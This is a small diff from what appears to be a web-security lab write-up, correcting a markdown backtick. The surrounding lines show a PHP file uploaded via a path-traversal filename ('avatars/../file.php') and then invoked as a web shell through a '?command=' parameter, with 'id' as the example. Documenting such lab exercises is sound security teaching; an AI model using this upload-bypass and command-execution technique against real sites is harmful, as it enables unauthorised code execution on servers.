@@ -132,7 +132,7 @@ Content-Length: 132
 The file avatars/../file.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
 ```
 
-Now if we try to access the file at `academy.net/files/file.php & run it using the `?command=` parameter, we get the executed command back in the response.
+Now if we try to access the file at `academy.net/files/file.php` & run it using the `?command=` parameter, we get the executed command back in the response.
 
 ie - `https://academy.net/files/file.php?command=id`
 
